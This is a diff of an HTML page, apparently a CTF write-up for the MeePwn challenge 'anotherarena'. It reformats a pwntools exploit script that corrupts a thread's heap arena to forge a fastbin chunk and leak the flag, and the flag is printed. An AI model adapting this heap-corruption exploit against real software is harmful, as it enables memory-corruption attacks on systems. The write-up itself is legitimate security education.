@@ -332,60 +332,58 @@
   <li>Print out the license and get the flag</li>
 </ol>
 
-<p>```python exp_arena.py
-#!/usr/bin/env python</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “139.59.241.76”
-PORT = 31335
-ELF_PATH = “./anotherarena_noalarm”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"139.59.241.76"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31335</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./anotherarena_noalarm"</span>
 
-<p>context.binary = ELF_PATH
-context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
-context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach</p>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
 
-<p>elf = context.binary # context.binary is an ELF object</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
 
-<p>flag = 0x602101
-fake_chunk = 0x6020bd</p>
+<span class="n">flag</span> <span class="o">=</span> <span class="mh">0x602101</span>
+<span class="n">fake_chunk</span> <span class="o">=</span> <span class="mh">0x6020bd</span>
 
-<p>def write(off, data):
-    r.send(p32(off))
-    time.sleep(0.5)
-    r.send(p32(data))
-    time.sleep(0.5)</p>
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">off</span><span class="p">))</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"50"</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+    <span class="c"># move the offset to thread's arena + 0x30 ( fastbin[5], size=0x70 )</span>
+    <span class="c"># fake chunk near stderr, use its 0x7f to create fake chunk</span>
+    <span class="n">write</span><span class="p">(</span><span class="mh">0xfffff790</span><span class="p">,</span> <span class="n">fake_chunk</span><span class="p">)</span>
+    <span class="c"># make final answer = 3233853430</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x7fffffff</span><span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x40c0af8f</span><span class="p">)</span>
+    
+    <span class="c"># break loop</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">))</span> 
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+    
+    <span class="c"># allocate buf &amp; pad to flag</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"104"</span><span class="p">)</span> <span class="c"># allocate 104 byte</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"i"</span><span class="o">*</span><span class="mh">0x34</span><span class="p">)</span> <span class="c"># pad to flag</span>
 
-r.sendline("50")
-time.sleep(0.5)
-# move the offset to thread's arena + 0x30 ( fastbin[5], size=0x70 )
-# fake chunk near stderr, use its 0x7f to create fake chunk
-write(0xfffff790, fake_chunk)
-# make final answer = 3233853430
-write(0, 0x7fffffff)
-write(4, 0x40c0af8f)
-
-# break loop
-r.send(p32(100)) 
-time.sleep(0.5)
-
-# allocate buf &amp; pad to flag
-r.sendline("104") # allocate 104 byte
-time.sleep(0.5)
-r.send("i"*0x34) # pad to flag
-
-r.interactive() ```
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>flag: <code class="highlighter-rouge">MeePwnCTF{oveRwrit3_another_(main)_arena}</code></p>
-
 
         
       </section>
